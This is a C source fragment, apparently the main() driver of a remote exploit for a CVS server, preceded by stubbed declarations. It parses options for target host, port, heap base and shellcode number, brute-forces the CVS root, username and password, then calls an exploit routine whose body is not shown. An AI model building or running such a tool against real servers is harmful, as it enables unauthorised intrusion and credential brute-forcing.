
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 char* BANNER ;
 int EOF ;
 int ERR_CVSROOT ;
 int ERR_PASSWORD ;
 int ERR_USERNAME ;
 int QUIT (int ) ;
 int brute_cvsroot () ;
 int brute_password () ;
 int brute_username () ;
 scalar_t__ detectos ;
 int do_xploit () ;
 int getopt (int,char**,char*) ;
 void* heapbase ;
 void* host ;
 int is_scramble ;
 scalar_t__ isbsd ;
 int optarg ;
 void* pass ;
 void* port ;
 int printf (char*) ;
 void* root ;
 void* saddr ;
 void* scnum ;
 int setbuf (int ,int *) ;
 void* size ;
 int stderr ;
 int stdout ;
 void* strdup (int ) ;
 void* strtoul (int ,int ,int ) ;
 void* timeout ;
 int usage (char*) ;
 void* user ;

int main(int ac, char **av)
{
    int c;

    setbuf(stdout, ((void*)0));
    setbuf(stderr, ((void*)0));
    printf(BANNER);
    while ((c = getopt(ac, av, "r:u:p:h:P:s:S:t:iRbo:n:")) != EOF)
        {
            switch(c)
                {
                case 'b':
                    isbsd++;
                    break;
                case 'R':
                    detectos++;
                    break;
                case 'r':
                    root = strdup(optarg);
                    break;
                case 'i':
                    is_scramble = 1;
                    break;
                case 's':
                    saddr = strtoul(optarg, 0, 0);
                    break;
                case 't':
                    timeout = strtoul(optarg, 0, 0);
                    break;
                case 'S':
                    size = strtoul(optarg, 0, 0);
                    break;
                case 'u':
                    user = strdup(optarg);
                    break;
                case 'p':
                    pass = strdup(optarg);
                    break;
                case 'h':
                    host = strdup(optarg);
                    break;
                case 'P':
                    port = strtoul(optarg, 0, 0);
                    break;
                case 'o':
                    heapbase = strtoul(optarg, 0, 0);
                    break;
                case 'n':
                    scnum = strtoul(optarg, 0, 0);
                    break;
                default:
                    usage(av[0]);
                }
        }
    if (!host || (detectos && isbsd))
        usage(av[0]);
    if (!root)
        if(!brute_cvsroot())
            QUIT(ERR_CVSROOT);
    if (!user)
        if(!brute_username())
            QUIT(ERR_USERNAME);
    if (!pass)
        if(!brute_password())
            QUIT(ERR_PASSWORD);
    do_xploit();
    return (0);
}
